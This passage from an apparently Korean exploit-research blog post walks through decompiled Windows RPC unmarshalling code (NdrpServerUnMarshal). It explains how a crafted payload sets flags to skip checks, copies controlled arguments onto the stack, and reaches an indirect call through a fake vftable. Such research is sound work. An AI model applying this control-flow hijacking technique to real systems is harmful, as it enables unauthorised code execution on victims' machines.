&lt;p&gt;ProcDesc&amp;#xC758; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xB9CE;&amp;#xC740; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;?  if&amp;#xB85C; ProcDesc&amp;#xC758; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xB97C; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;NdrpPipesInitialize&lt;/code&gt;&amp;#xB098; &lt;code&gt;NdrServerInitializePartial&lt;/code&gt; &amp;#xB4F1; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xD638;&amp;#xCD9C;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB4E4;&amp;#xC740; &amp;#xAD73;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC5C6;&amp;#xC5B4; &amp;#xBCF4;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB4A4;&amp;#xC5D0; &amp;#xB098;&amp;#xC62C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC774;&amp;#xB97C; &amp;#xAC74;&amp;#xB108;&amp;#xB6F8; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xB97C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC92C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD2B9;&amp;#xD788; &lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &amp;#xC778;&amp;#xC790;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xC2DC;&amp;#xC791;&amp;#xACFC; &amp;#xB05D;&amp;#xC774; &lt;code&gt;pStubMsg&lt;/code&gt;&amp;#xC758; &lt;code&gt;Buffer&lt;/code&gt;, &lt;code&gt;BufferStart&lt;/code&gt;&amp;#xC640; &lt;code&gt;BufferEnd&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5C8;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xD6C4; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xB85C; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;Argument-Parsing-NdrpServerUnMarshal&#34;&gt;&lt;a href=&#34;#Argument-Parsing-NdrpServerUnMarshal&#34; class=&#34;headerlink&#34; title=&#34;Argument Parsing(NdrpServerUnMarshal)&#34;&gt;&lt;/a&gt;Argument Parsing(&lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;)&lt;/h3&gt;&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xC720;&amp;#xC77C;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;NdrpServerInit&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;StubMsg&lt;/code&gt;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;NdrpServerUnMarshal(&amp;amp;pStubMsg);&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;hljs-title&#34;&gt;NdrpServerUnMarshal&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(struct _MIDL_STUB_MESSAGE *pStubMsg1)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  pContext1 = pStubMsg1-&amp;gt;pContext;
  v3 = pContext1-&amp;gt;DceTypeFormatString;
  isDataRep0x10 = LOWORD(pStubMsg1-&amp;gt;RpcMsg-&amp;gt;DataRepresentation) == &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
  Params = (__int16 *)pContext1-&amp;gt;Params;
  v64 = v3;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !isDataRep0x10 )
  {
    NdrConvert2(pStubMsg1, (PFORMAT_STRING)Params, pContext1-&amp;gt;NumberParams);
    v3 = v64;
  }
  v6 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pContext1-&amp;gt;NumberParams )
  {
    v8 = &lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;i64;
    &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;
    {
      flag = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i];                     &lt;span class=&#34;hljs-comment&#34;&gt;// Param + i*3 (0,6,9,12...)&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xC&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
      {
        StackIndex = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16)Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;// Params + i*3 + 1 (1,7,10,13...)&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x800&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        {
          StackBufferPointer = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;pContext1-&amp;gt;StartofStack[StackIndex];
          v47 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)(pStubMsg1-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;);
          v65 = StackBufferPointer;
          v47 &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64;        &lt;span class=&#34;hljs-comment&#34;&gt;// align&lt;/span&gt;
          pStubMsg1-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)v47;
          *(_QWORD *)StackBufferPointer = *(_DWORD *)v47 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
          pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        {
          StackBufferPointer1 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;pContext1-&amp;gt;StartofStack[StackIndex];
          v65 = StackBufferPointer1;
          flag2 = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i];
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
          {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
            {
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
              {
LABEL_34:
                v28 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)(pStubMsg1-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64);&lt;span class=&#34;hljs-comment&#34;&gt;// align 0x4&lt;/span&gt;
                pStubMsg1-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)v28;&lt;span class=&#34;hljs-comment&#34;&gt;// align Buffer&lt;/span&gt;
                ParamValue = *v28;
LABEL_35:
                *(_QWORD *)StackBufferPointer1 = ParamValue;&lt;span class=&#34;hljs-comment&#34;&gt;// Copy data from my RPC_MESSAGE buffer to NDR_PROC_CONTEXT.AllocateContext.PreAllocateBlock(Real Buffer used calling Invoke)&lt;/span&gt;
LABEL_36:
                pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
              }
              &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
              {
               ...
              }
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg1-&amp;gt;Buffer &amp;gt; pStubMsg1-&amp;gt;BufferEnd )
                RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);
              &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_23;
            }
            v34 = *((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)&amp;amp;_ImageBase + LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) + &lt;span class=&#34;hljs-number&#34;&gt;0xEDB20&lt;/span&gt;);
            v35 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)(~v34 &amp;amp; (__int64)&amp;amp;pStubMsg1-&amp;gt;Buffer[v34]);
            pStubMsg1-&amp;gt;Buffer = v35;
            v36 = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v36 == &lt;span class=&#34;hljs-number&#34;&gt;-72&lt;/span&gt; || v36 == &lt;span class=&#34;hljs-number&#34;&gt;-71&lt;/span&gt; )
            {
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pContext1-&amp;gt;AllocateContext.BytesRemaining &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;ui64 )
              {
                v48 = (_LIST_ENTRY *)I_RpcBCacheAllocate(&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;ui64);
                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v48 )
                  RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
                v49 = &amp;amp;pContext1-&amp;gt;AllocateContext.MemoryList;
                v50 = pContext1-&amp;gt;AllocateContext.MemoryList.Flink;
                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v50-&amp;gt;Blink != &amp;amp;pContext1-&amp;gt;AllocateContext.MemoryList )
                  __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;3u&lt;/span&gt;);
                v48-&amp;gt;Flink = v50;
                v8 = &lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;i64;
                v48-&amp;gt;Blink = v49;
                v50-&amp;gt;Blink = v48;
                v49-&amp;gt;Flink = v48;
                pContext1-&amp;gt;AllocateContext.pBlockPointer = (__int64)&amp;amp;v48[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
                pContext1-&amp;gt;AllocateContext.BytesRemaining = &lt;span class=&#34;hljs-number&#34;&gt;4080&lt;/span&gt;i64;
              }
              pContext1-&amp;gt;AllocateContext.BytesRemaining -= &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;i64;
              v51 = (_QWORD *)pContext1-&amp;gt;AllocateContext.pBlockPointer;
              v3 = v64;
              pContext1-&amp;gt;AllocateContext.pBlockPointer = (__int64)(v51 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;);
              *(_QWORD *)v65 = v51;
              v52 = pStubMsg1-&amp;gt;Buffer;
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) == &lt;span class=&#34;hljs-number&#34;&gt;0xB8&lt;/span&gt; )
                *v51 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)v52;
              &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
                **(_QWORD **)v65 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)v52;
              pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
              &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_23;
            }
            *(_QWORD *)StackBufferPointer1 = v35;
            pStubMsg1-&amp;gt;Buffer += *((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)&amp;amp;_ImageBase + LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) + &lt;span class=&#34;hljs-number&#34;&gt;973408&lt;/span&gt;);
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg1-&amp;gt;Buffer &amp;gt; pStubMsg1-&amp;gt;BufferEnd )
              RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);
          }
          &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
          {
            ...
          }
          v3 = v64;
        }
      }
LABEL_23:
      ++i;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; ( i &amp;lt; pContext1-&amp;gt;NumberParams );
  }
  v21 = pStubMsg1-&amp;gt;pCorrInfo;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v21 )&lt;span class=&#34;hljs-comment&#34;&gt;//NULL&lt;/span&gt;
  {
	  ...
  }
  v22 = pStubMsg1-&amp;gt;Buffer;
  v23 = pStubMsg1-&amp;gt;BufferEnd;
  v24 = pStubMsg1-&amp;gt;RpcMsg;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v22 + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; &amp;lt; v23 )
  {
    ...
  }
LABEL_26:
  v25 = pStubMsg1-&amp;gt;RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1-&amp;gt;RpcMsg-&amp;gt;Handle;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v26 )&lt;span class=&#34;hljs-comment&#34;&gt;//corrupted vftable&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (pStubMsg1-&amp;gt;pContext-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    {
      LODWORD(v25) = (*((__int64 (__fastcall **)(struct _MIDL_STUB_MESSAGE *))pNdrOleExtensionsTable + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;))(pStubMsg1);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v27 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__fastcall **)(LRPC_SCALL *, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(*(_QWORD *)v26 + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;i64);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        LODWORD(v25) = v27(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;//call function of vftable+0x100&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_DWORD)v25 )&lt;span class=&#34;hljs-comment&#34;&gt;//if return value is not 0&lt;/span&gt;
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;//Exception :(&lt;/span&gt;
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v25;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xC758; &lt;code&gt;DataRepresentation&lt;/code&gt;&amp;#xC774; 0x10&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &lt;code&gt;NdrConvert2&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294;&amp;#xB370; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xB3C4; &amp;#xAC74;&amp;#xB108;&amp;#xB6F8; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xC774;&amp;#xD6C4; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xC2DC;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; ProcString&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; Param&amp;#xC744; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &lt;code&gt;pContext-&amp;gt;Params&lt;/code&gt;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD574;&amp;#xC11C; &lt;code&gt;pStubMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &lt;code&gt;RpcMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574;&amp;#xC11C; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC758; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Params&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; 2&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xD544;&amp;#xB4DC; &amp;#xC138; &amp;#xAC1C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC838; &amp;#xC788;&amp;#xACE0; &amp;#xAC01;&amp;#xAC01; Flag, &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xC778;&amp;#xB371;&amp;#xC2A4;, &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;(?)&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;Flag &amp;#xAC12;&amp;#xACFC; &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xB2E4;&amp;#xB978; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xC218;&amp;#xD589;&amp;#xB418;&amp;#xB294;&amp;#xB370; Flag&amp;#xAC00; 0x48&amp;#xC77C; &amp;#xB54C;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xC&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
      {
        StackIndex = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16)Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;// Params + i*3 + 1 (1,7,10,13...)&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x800&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        {
          ...
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        {
          StackBufferPointer1 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&amp;amp;pContext1-&amp;gt;StartofStack[StackIndex];
          v65 = StackBufferPointer1;
          flag2 = Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i];
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
          {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (flag2 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
            {
              &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( LOBYTE(Params[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]) == &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; )
              {
LABEL_34:
                v28 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)(pStubMsg1-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64);&lt;span class=&#34;hljs-comment&#34;&gt;// align 0x4&lt;/span&gt;
                pStubMsg1-&amp;gt;Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)v28;&lt;span class=&#34;hljs-comment&#34;&gt;// align Buffer&lt;/span&gt;
                ParamValue = *v28;
LABEL_35:
                *(_QWORD *)StackBufferPointer1 = ParamValue;&lt;span class=&#34;hljs-comment&#34;&gt;// Copy data from my RPC_MESSAGE buffer to NDR_PROC_CONTEXT.AllocateContext.PreAllocateBlock(Real Buffer used calling Invoke)&lt;/span&gt;
LABEL_36:
                pStubMsg1-&amp;gt;Buffer += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;pStubMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xC11C; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xB9CC;&amp;#xD07C;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &lt;code&gt;pContext-&amp;gt;StartofStack[StackIndex]&lt;/code&gt;&amp;#xC5D0; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! 8&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xC778;&amp;#xC790; &amp;#xD558;&amp;#xB098;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xC778;&amp;#xC790; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; 8&amp;#xC774;&amp;#xACE0; StackIndex&amp;#xAC00; &amp;#xAC01;&amp;#xAC01; 0, 4&amp;#xC778; Param &amp;#xB450; &amp;#xAC1C;&amp;#xAC00; &amp;#xD544;&amp;#xC694;&amp;#xD558;&amp;#xACA0;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC774; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;LABEL_26:
  v25 = pStubMsg1-&amp;gt;RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1-&amp;gt;RpcMsg-&amp;gt;Handle;&lt;span class=&#34;hljs-comment&#34;&gt;//VideoDirtListener, first entry of fake vftable&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v26 )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (pStubMsg1-&amp;gt;pContext-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    {
      ...
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
